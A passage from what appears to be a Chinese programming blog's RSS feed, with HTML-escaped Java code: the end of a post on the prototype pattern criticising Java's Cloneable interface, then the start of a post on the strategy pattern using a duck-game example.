System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>clonePrototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span>&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]);&lt;/span>
Object object2 &lt;span style="color:#f92672">=&lt;/span> prototype&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">models&lt;/span>&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">];&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>object1 &lt;span style="color:#f92672">==&lt;/span> object2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>CloneNotSupportedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出结果&lt;/p>
&lt;blockquote>
&lt;p>java.lang.Object@63947c6b
java.lang.Object@63947c6b
true&lt;/p>
&lt;/blockquote>
&lt;p>这太可怕了。你不得不仔细检查你的每一个属性，直到你确保他们的 clone 都得到调用为止。&lt;/p>
&lt;p>接着，如果你的类设计为了一个不可变类，或者类中有 final 字段的话，那么恭喜，clone 架构与引用可变对象的 final 是不兼容的，clone 方法无法为 final 字段赋值。因为你无法在初始化以外的地方重新改变引用。&lt;/p>
&lt;p>然后，clone 方法“意料之中”的不是同步的。这意味着如果想让你的对象在并发中安全的话，则得花心思在 clone 方法的同步处理上。而由于 clone 架构与 fina l 设计理念冲突的原因，你又无法将你的类设计为不可变类！&lt;/p>
&lt;p>最后，如果你的对象是出于被继承的目的而被设计出来的话，那么你的 clone 方法总是会被所有子类重写。所以建议被继承的类保持与 Object 的设计一致，不主动实现 Cloneable 方法。但是你需要覆盖 clone 方法，重写 clone 逻辑，方法保持 protected 的访问权限。这样做得以让子类拥有是否实现接口的自由，并且还能保证你的类能够拥有正确的“深拷贝”行为。&lt;/p>
&lt;p>所以，如果你想要写出健壮，安全，维护性强的代码，你就应该考虑告别 Cloneable 接口。这个世界上，有些经验丰富的程序员永远不会实现 Cloneable 接口。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>原型模式常常和其他设计模式搭配使用。&lt;/li>
&lt;li>注意深浅拷贝的区别。&lt;/li>
&lt;li>鉴于 Cloneable 糟糕的设计，对于任何自定义类，如果你没有充足的把握，请不要实现 Cloneable 接口。凡是实现了 Cloneable 接口的自定义类，一定要给用户提供安全的 clone 实现。&lt;/li>
&lt;li>如果你的自定义类需要并发安全，请花心思对 clone 方法进行同步处理。&lt;/li>
&lt;li>复杂对象建议使用序列化+流的方式重写。这相当安全，并且不容易出错。&lt;/li>
&lt;/ol></description></item><item><title>策略设计模式</title><link>https://www.chucklin.net/post/strategy_designmode/</link><pubDate>Tue, 02 Jan 2018 14:01:23 +0800</pubDate><guid>https://www.chucklin.net/post/strategy_designmode/</guid><description>&lt;p>策略设计模式定义了算法族（行为族）分别封装起来让他们之间可以互相替换。此模式让算法的变化独立于使用算法的客户。&lt;/p>
&lt;h2 id="为什么要用策略设计模式">为什么要用策略设计模式？&lt;/h2>
&lt;p>试想这样一种业务场景。
公司设计了一款与鸭子有关的游戏，游戏中有各种各样的鸭子在水里嬉戏。
现在游戏里一共有两种鸭子，分别是红头鸭与绿头鸭，且具备喊叫与游泳这两种行为。&lt;/p>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/ndvvr3zivx6ncokiryj18pzv/duck.png" alt="duck.png-21.3kB">&lt;/p>
&lt;p>每种鸭子的外观都不同，所以 display() 是抽象方法。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 策略设计模式
&lt;/span>&lt;span style="color:#75715e"> * 鸭子超类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Duck&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子叫&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">swim&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子游泳&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 绿头鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MallardDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;绿头鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 红头鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RedHeadDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;红头鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>随着市场竞争变得越来越大，公司高层经过讨论决定需要给鸭子加上一个会飞的功能。这个需求太简单了，我只要一分钟就可以解决。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 策略设计模式
&lt;/span>&lt;span style="color:#75715e"> * 鸭子超类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Duck&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子叫&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">swim&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;游泳&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;飞翔&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>新功能上线后的第二天经理通知我咱们遇到了大麻烦。原来公司游戏里除了红头、绿头鸭以外还有一种橡皮鸭。现在橡皮鸭在天空中飞来飞去。这该如何是好呢？我毕竟是一个面向对象程序员，立刻就想到了使用 override 来解决这个问题。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 橡皮鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RubberDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">//do nothing
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">//do nothing
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;橡皮鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>问题解决了。可是，若是将来游戏里出现了诱饵鸭、机械鸭等等其他鸭子，每种鸭子的行为都有所不同,难道每次加入新的鸭子都去检查并覆盖 duck 中的方法吗？
看来使用继承来为所有的鸭子提供行为会造成很多麻烦，于是我想到了尝试用接口来解决这个问题。&lt;/p>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/6qh59l7jyhttsn1vr4oirg97/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-06%20%E4%B8%8B%E5%8D%882.40.27.png" alt="屏幕快照 2016-11-06 下午2.40.27.png-41.5kB">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Duck&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// public void quack() {
&lt;/span>&lt;span style="color:#75715e">// System.out.println(&amp;#34;鸭子叫&amp;#34;);
&lt;/span>&lt;span style="color:#75715e">// }
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">swim&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子游泳&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// public void fly() {
&lt;/span>&lt;span style="color:#75715e">// System.out.println(&amp;#34;飞行&amp;#34;);
&lt;/span>&lt;span style="color:#75715e">// }
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 会飞的接口
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Flyable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 会叫的接口
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Quackable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 绿头鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MallardDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#66d9ef">implements&lt;/span> Flyable&lt;span style="color:#f92672">,&lt;/span> Quackable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;飞行&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子叫&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;绿头鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 橡皮鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RubberDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;橡皮鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将容易产生变化的行为独立抽象成为接口，在需要这些行为的子类对象中分别实现不同的具体行为，这样就避免了每个子类都需要去检查并覆盖父类方法的工作！然而经理对这样的做法产生了疑问。由于将变化的行为声明为接口后，需要该行为的子类对象都需要去实现接口中的方法。
若有 100 支鸭子岂不是要实现 100 次行为？这无疑加大了工作量甚至会造成项目延期交付！&lt;/p>
&lt;p>幸运的是，有一个设计原则刚好适用于此种情况：&lt;/p>
&lt;blockquote>
&lt;p>找出应用中可能需要变化之处，把它们独立出来，不要和那些不需要变化的代码混在一起。&lt;/p>
&lt;/blockquote>
&lt;h2 id="策略设计模式怎么用">策略设计模式怎么用？&lt;/h2>
&lt;p>现在，根据此原则来重新设计这个鸭子游戏。
首先将容易产生变化的部分（quack 与 fly）抽取出来，重构为两组实现了 quackable 与 flyable 的类。（别误会，我不是让你使用多重继承）接着想办法让鸭子把容易变化的 fly 与 quack 委托（delegate）给别人处理。最后为了提供更强的灵活性，我们需要在运行中也能给鸭子对象灵活的设置不同的行为模式。比如增加一个火箭发射器使橡皮鸭也能飞！&lt;/p>
&lt;p>具体应该怎么样实现这样的设计呢？另一个设计原则发挥作用的时候到了。&lt;/p>
&lt;blockquote>
&lt;p>多用组合，少用继承。抽象变化的部分，将变化的部分独立出来封装成单独的模块。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/o56vg1gayivbj66zxrjpjd0v/Duck4.png" alt="Duck4.png-61kB">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 飞行的行为接口
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Flyable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 飞行行为类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Fly&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Flyable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;飞翔&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 不能飞行为类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FlyNoWay&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Flyable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;不能飞&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 火箭飞行行为类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FlyWithRockets&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Flyable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;火箭飞行&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 呱呱叫行为接口
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Quackable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 沉默行为类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MuteQuack&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Quackable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;无法呱呱叫&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 呱呱叫行为类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Quack&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Quackable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
